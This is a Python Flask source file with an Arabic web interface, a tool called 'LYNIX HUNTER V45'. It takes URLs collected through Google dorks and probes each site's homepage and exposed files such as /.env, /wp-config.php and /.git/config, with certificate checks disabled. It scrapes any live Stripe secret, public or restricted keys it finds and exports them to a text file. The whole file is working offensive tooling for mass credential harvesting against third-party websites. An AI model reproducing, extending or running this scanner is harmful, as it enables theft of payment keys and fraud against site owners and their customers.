import requests
import re
import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# أنماط البحث عن مفاتيح Stripe (Regex)
STRIPE_PATTERNS = {
    "Secret Key": r"sk_live_[a-zA-Z0-9]{24,}",
    "Public Key": r"pk_live_[a-zA-Z0-9]{24,}",
    "Restricted Key": r"rk_live_[a-zA-Z0-9]{24,}"
}

# المسارات الحساسة للفحص العميق
DEEP_PATHS = ['/.env', '/config.php', '/js/app.js', '/wp-config.php', '/.git/config']

def deep_scanner(url):
    found_keys = []
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0'}
    
    # فحص الصفحة الرئيسية + الملفات الحساسة
    for path in [''] + DEEP_PATHS:
        try:
            target = url.rstrip('/') + path
            res = requests.get(target, headers=headers, timeout=5, verify=False)
            if res.status_code == 200:
                for label, pattern in STRIPE_PATTERNS.items():
                    matches = re.findall(pattern, res.text)
                    for m in matches:
                        found_keys.append({"type": label, "key": m, "path": path or "/"})
        except: continue
    return found_keys

@app.route('/')
def index():
    return render_template_string(HTML_UI)

@app.route('/scan', methods=['POST'])
def scan():
    urls = request.json.get('urls', [])
    results = []
    for url in urls:
        if not url.strip(): continue
        keys = deep_scanner(url.strip())
        results.append({"url": url, "keys": keys})
    return jsonify({"status": "success", "results": results})

HTML_UI = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>LYNIX HUNTER V45</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
        .section { border: 1px solid #0f0; padding: 20px; margin-bottom: 20px; background: #050505; border-radius: 10px; box-shadow: 0 0 15px #0f0; }
        textarea { width: 98%; height: 150px; background: #111; color: #fff; border: 1px solid #333; padding: 10px; font-family: monospace; }
        button { padding: 12px 25px; cursor: pointer; font-weight: bold; border: none; border-radius: 5px; margin: 5px; }
        .btn-scan { background: #0f0; color: #000; }
        .btn-save { background: #fff; color: #000; }
        #results { background: #000; border: 1px solid #222; padding: 15px; height: 350px; overflow-y: scroll; text-align: left; }
        .found-item { border-bottom: 1px solid #333; padding: 10px; }
        .key-text { color: yellow; font-weight: bold; }
    </style>
</head>
<body>
    <h1>[ LYNIX HUNTER V45 - PROFESSIONAL ]</h1>

    <div class="section">
        <h2>1️⃣ تجميع الروابط</h2>
        <p>انسخ الروابط من جوجل (Dorks) والصقها هنا:</p>
        <textarea id="urlInput" placeholder="https://example1.com&#10;https://example2.com"></textarea>
    </div>

    <div class="section">
        <h2>2️⃣ الفحص والتحليل</h2>
        <button class="btn-scan" onclick="startScan()">بدء الفحص العميق ⚡</button>
        <button class="btn-save" onclick="saveToFile()">تحميل النتائج (TXT) 💾</button>
        <div id="status" style="margin: 10px 0; color: yellow;"></div>
        <div id="results">بانتظار بدء العملية...</div>
    </div>

    <script>
        let lastResults = "";

        async function startScan() {
            const urls = document.getElementById('urlInput').value.split('\\n');
            const resDiv = document.getElementById('results');
            const status = document.getElementById('status');
            
            status.innerHTML = "⏳ جاري الفحص شبر شبر... يرجى عدم إغلاق الصفحة";
            resDiv.innerHTML = "";
            lastResults = "--- LYNIX SCAN RESULTS ---\\n\\n";

            const response = await fetch('/scan', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ urls: urls })
            });
            const data = await response.json();
            
            status.innerHTML = "✅ اكتمل الفحص!";
            data.results.forEach(item => {
                let keysInfo = "";
                if(item.keys.length > 0) {
                    item.keys.forEach(k => {
                        keysInfo += `<br> <span class="key-text">[${k.type}]</span> ${k.key} (Path: ${k.path})`;
                        lastResults += `URL: ${item.url}\\nTYPE: ${k.type}\\nKEY: ${k.key}\\nPATH: ${k.path}\\n------------------\\n`;
                    });
                } else {
                    keysInfo = "<br> <span style='color:#555;'>- لم يتم العثور على ثغرات</span>";
                }
                resDiv.innerHTML += `<div class="found-item"><b style="color:#00bcff;">[URL]: ${item.url}</b>${keysInfo}</div>`;
            });
        }

        function saveToFile() {
            const blob = new Blob([lastResults], { type: 'text/plain' });
            const anchor = document.createElement('a');
            anchor.download = "stripe_keys_results.txt";
            anchor.href = (window.URL || window.webkitURL).createObjectURL(blob);
            anchor.dataset.downloadurl = ['text/plain', anchor.download, anchor.href].join(':');
            anchor.click();
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
